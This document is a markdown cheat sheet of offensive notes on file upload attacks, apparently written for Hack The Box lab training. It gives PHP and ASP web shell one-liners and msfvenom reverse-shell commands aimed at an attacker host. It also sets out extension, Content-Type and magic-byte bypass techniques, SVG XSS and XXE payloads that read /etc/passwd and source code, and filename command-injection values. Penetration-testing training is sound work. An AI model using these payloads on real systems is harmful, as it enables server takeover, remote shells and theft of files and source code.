l# File Upload Attacks

---

## Identify the Stack

Check the `Server:` response header. Browse to `/index.php`, `/index.asp`, `/index.aspx`, `/index.jsp` — whichever returns 200 is your language. Wappalyzer browser extension gives you OS, server, framework, version instantly. No extension visible in URL means web routing is used — fuzz with a web extensions wordlist through Burp Intruder on the index page. Shell language must match backend language or it won't execute.

---

## No Validation

Start with a canary — `<?php echo "test"; ?>` in `test.php`, upload, visit the path. If it prints `test` the server is executing PHP. Source code printed instead means read-only, no execution. Find the upload path from the page source after upload — look for `src=` or `href=` attributes pointing to your file. Common paths: `/uploads/`, `/files/`, `/images/`, `/profile_images/`, `/assets/`.

Web shell one-liners to memorize:

```php
<?php system($_REQUEST['cmd']); ?>
```

```asp
<% eval request('cmd') %>
```

Visit with `?cmd=id`. Use `CTRL+U` view-source in browser to see clean output without HTML rendering breaking the formatting.

phpbash — https://github.com/Arrexel/phpbash — upload `phpbash.php`, get a proper terminal UI in the browser without needing outbound connectivity.

SecLists web shells live at `/opt/useful/seclists/Web-Shells/` — PHP, ASP, ASPX, JSP all there ready to go.

For reverse shell grab pentestmonkey — https://github.com/pentestmonkey/php-reverse-shell — edit `$ip` and `$port` on lines 49/50, `nc -lvnp PORT` on your machine, upload, visit the URL.

Or generate with msfvenom:

```bash
msfvenom -p php/reverse_php LHOST=10.10.14.x LPORT=9001 -f raw > rev.php
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.x LPORT=9001 -f raw > rev.jsp
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.x LPORT=9001 -f aspx > rev.aspx
```

Reverse shell always preferred over web shell — full interactive PTY once you upgrade. Web shell is fallback when firewall blocks outbound.

---

## Client-Side Validation

Page shows an error when you pick a file but never sends an HTTP request — all JS, nothing touched the server yet. You own everything running in your browser.

**Burp method:** upload a legit image, intercept the request, change `filename="image.png"` to `filename="shell.php"`, replace file content with your webshell, forward. Backend never sees the client-side check.

**DevTools method (`CTRL+SHIFT+C`):** click the upload element in the inspector, find `onchange="checkFile(this)"` in the HTML, double-click the function name and delete it. Also remove `accept=".jpg,.jpeg,.png"` to open the file picker. Changes live only in your browser session — temporary but enough. Check console (`CTRL+SHIFT+K`) to read the actual checkFile function and see exactly what it's validating if you want to understand it.

After uploading, `CTRL+SHIFT+C` again and click the profile image to see the `src` attribute — that's your shell path.

---

## Blacklist Bypass

Server rejects `.php`, `.php7`, `.phps` — the list is never complete. Fuzz the extension position in Burp Intruder. Grab the PHP extensions list from PayloadsAllTheThings: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Extension%20PHP/extensions.lst

In Intruder mark the extension position in `filename="HTB.§php§"`, load the list, uncheck URL encoding (or the dot gets encoded), sort results by Content-Length — longer response = different message = allowed extension.

Extensions blacklists miss constantly: `.phtml`, `.phar`, `.php5`, `.pht`, `.shtml`, `.php3`, `.php4`. Try `.phtml` first.

Blacklist comparison is usually case-sensitive. Windows file execution is case-insensitive. Try `shell.pHp`, `shell.PHP`, `shell.Php` on IIS targets.

---

## Whitelist Bypass

Regex check without `$` anchor — `preg_match('^.*\.(jpg|jpeg|png|gif)', $filename)` — checks if the extension exists anywhere in the filename, not that it ends there.

Double extension: `shell.jpg.php` — contains `.jpg` so passes, ends with `.php` so Apache executes it.

Strict regex with `$` anchor — `^.*\.(jpg|jpeg|png|gif)$` — only matches the final extension. Double extension won't work here.

Reverse double extension exploits Apache `FilesMatch` misconfiguration. If `/etc/apache2/mods-enabled/php7.4.conf` has:

```xml
<FilesMatch ".+\.ph(ar|p|tml)">
    SetHandler application/x-httpd-php
</FilesMatch>
```

No `$` at the end means any file containing `.php` anywhere executes as PHP. `shell.php.jpg` — ends with `.jpg` passes the whitelist, contains `.php` so Apache hands it to the PHP interpreter.

Character injection — generate a wordlist and fuzz:

```bash
for char in '%20' '%0a' '%00' '%0d0a' '/' '.\\' '.' '…' ':'; do
    for ext in '.php' '.phps'; do
        echo "shell$char$ext.jpg" >> wordlist.txt
        echo "shell$ext$char.jpg" >> wordlist.txt
        echo "shell.jpg$char$ext" >> wordlist.txt
        echo "shell.jpg$ext$char" >> wordlist.txt
    done
done
```

`shell.php%00.jpg` — null byte terminates the string at `%00` on PHP < 5.5, server stores `shell.php` while the whitelist check sees `.jpg`.

`shell.aspx:.jpg` — Windows colon injection, writes as `shell.aspx`.

---

## Content-Type Bypass

`$_FILES['uploadFile']['type']` reads the `Content-Type` header from the multipart request — browser sets it from the file extension on your machine, meaning it's client-controlled. Intercept in Burp, find the `Content-Type:` header on the file part of the request (bottom half of multipart body, not the top-level request header), change it to `image/jpeg` or `image/png`, keep `filename="shell.php"`.

Note there are two Content-Type headers in multipart upload requests — top-level for the full request, inner one for the file attachment. Change the inner one.

To fuzz which content types are accepted:

```bash
wget https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Discovery/Web-Content/web-all-content-types.txt
cat web-all-content-types.txt | grep 'image/' > image-content-types.txt
```

---

## MIME / Magic Bytes Bypass

`mime_content_type()` reads the actual first bytes of the file — not the header, not the extension. GIF magic bytes are `GIF8` — ASCII printable, easy to type and prepend. Other image formats use binary bytes you'd have to hex-encode.

```bash
echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.php
file shell.php
# → shell.php: GIF image data
```

Upload `shell.php` — MIME check passes because first bytes say GIF, PHP still executes everything after. Output starts with `GIF8` before your command output, that's expected.

When both Content-Type header AND magic bytes are checked simultaneously — prepend `GIF8` to file content and change `Content-Type: image/gif` in Burp. Both checks pass, PHP executes.

Combine techniques: allowed MIME type with disallowed Content-Type, allowed MIME with disallowed extension, disallowed MIME with allowed extension — keep permuting until one slips through.

---

## Limited Uploads — No RCE But Still Useful

When only SVG, HTML, XML are allowed you can still do real damage.

XSS via SVG — uploaded file renders in users' browsers and fires JS:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg xmlns="http://www.w3.org/2000/svg" version="1.1" width="1" height="1">
    <rect x="1" y="1" width="1" height="1" fill="green" stroke="black" />
    <script type="text/javascript">alert(window.origin);</script>
</svg>
```

XSS via EXIF metadata — app shows image metadata after upload:

```bash
exiftool -Comment=' "><img src=1 onerror=alert(window.origin)>' HTB.jpg
```

XXE via SVG to read server files — if app processes SVG server-side:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<svg>&xxe;</svg>
```

XXE via SVG for PHP source code — base64 to avoid XML parsing issues:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
<svg>&xxe;</svg>
```

Output is base64 blob, decode locally:

```bash
echo '<blob>' | base64 -d
```

This gives you source code — find upload path, find allowed extensions, find naming scheme, find other vulns.

---

## Filename Injection

App takes your filename and uses it in an OS command, SQL query, or displays it — inject into the name itself:

```
file$(whoami).jpg
file`whoami`.jpg
file.jpg||whoami
<script>alert(window.origin);</script>.jpg
file';select+sleep(5);--.jpg
```

If the app does `mv $filename /tmp/uploads/` without sanitizing, your injected command runs. Blind — check timing or use a callback to a server you control to confirm execution.

---

## Upload Path Discovery

Check page source after upload for `src=` or `href=` containing your filename. Fuzz common upload directories:

```bash
ffuf -w /opt/useful/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ \
  -u http://<IP>:<PORT>/FUZZ/ -mc 200,301,302
```

Force errors to leak path — upload a file with a name that already exists, send two identical requests simultaneously, or upload a filename with 5000+ characters. Error messages often print the full server path.

Use XXE or LFI alongside upload to read source code and grep for the upload directory configuration. IDOR techniques from Web Attacks module also apply here — find the naming scheme, predict other users' file paths.

---

## Windows-Specific

Reserved characters in filename cause errors that may leak the upload path: `|`, `<`, `>`, `*`, `?` — if not quoted in shell commands these expand and break things.

Reserved filenames the OS won't write: `CON`, `COM1`, `LPT1`, `NUL` — app tries to write and gets an OS error, often leaks path info.

Windows 8.3 naming convention — `hackthebox.txt` can be referenced as `HAC~1.TXT`. You can write `WEB~1.CON` to overwrite `web.conf`. Useful for overwriting config files or triggering errors on existing file conflicts.

---

## Resources

PayloadsAllTheThings upload section — https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files

PHP extensions wordlist — https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Extension%20PHP/extensions.lst

SecLists web shells — `/opt/useful/seclists/Web-Shells/`

SecLists content types — `/opt/useful/seclists/Discovery/Web-Content/web-all-content-types.txt`

phpbash — https://github.com/Arrexel/phpbash

pentestmonkey PHP reverse shell — https://github.com/pentestmonkey/php-reverse-shell